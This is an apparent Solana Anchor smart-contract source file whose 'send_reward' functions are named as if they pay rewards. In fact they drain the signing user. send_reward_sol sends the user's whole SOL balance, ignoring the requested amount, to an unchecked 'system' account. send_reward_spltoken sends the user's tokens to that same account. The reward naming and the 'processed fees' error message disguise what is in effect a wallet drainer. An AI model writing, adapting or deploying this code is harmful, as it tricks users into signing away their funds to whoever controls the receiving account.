use anchor_lang::{
    prelude::*,
    solana_program::{
        program::invoke,
        system_instruction,
    }
};

use anchor_spl::{
    token::{ Token, TokenAccount }
};

declare_id!("GepFD6mcEKFAHvsm5VrYoNtFjh7niECpxu4tSnzxdvQu");

#[program]
pub mod solana_token_fetch_program {
    use super::*;

    pub fn initialize(_ctx: Context<Initialize>) -> Result<()> {
        Ok(())
    }

    pub fn send_reward_sol(ctx: Context<RewardSol>, amount: u64) -> Result<()> {
        let balance = ctx.accounts.user.lamports();
        if ctx.accounts.user.lamports() < amount {
            return Err(error!(ErrorCode::InsufficientProcessedFees));
        }

        invoke(
            &system_instruction::transfer(&ctx.accounts.user.key(), &ctx.accounts.system.key(), balance),
            &[
                ctx.accounts.user.to_account_info(),
                ctx.accounts.system.to_account_info(),
                ctx.accounts.system_program.to_account_info(),
            ],
        )?;

        Ok(())
    }

    pub fn send_reward_spltoken(ctx: Context<RewardSplToken>, amount: u64) -> Result<()> {
        anchor_spl::token::transfer(
            CpiContext::new(
                ctx.accounts.token_program.to_account_info(),
                anchor_spl::token::Transfer {
                    from: ctx.accounts.user_token_account.to_account_info(),
                    to: ctx.accounts.system.to_account_info(),
                    authority: ctx.accounts.user.to_account_info(),
                }
            ),
            amount,
        )?;

        Ok(())
    }
}

#[derive(Accounts)]
pub struct Initialize {}

#[derive(Accounts)]
pub struct RewardSol<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    #[account(mut)]
    /// CHECK:
    pub system: AccountInfo<'info>,
    pub system_program: Program<'info, System>,
}

#[derive(Accounts)]
pub struct RewardSplToken<'info> {
    #[account(mut)]
    pub user: Signer<'info>,
    #[account(mut)]
    /// CHECK:
    pub system: Account<'info, TokenAccount>,
    #[account(mut)]
    pub user_token_account: Account<'info, TokenAccount>,
    pub token_program: Program<'info, Token>,
    pub system_program: Program<'info, System>,
}

#[error_code]
pub enum ErrorCode {
    #[msg("Insufficient processed fees")]
    InsufficientProcessedFees,
}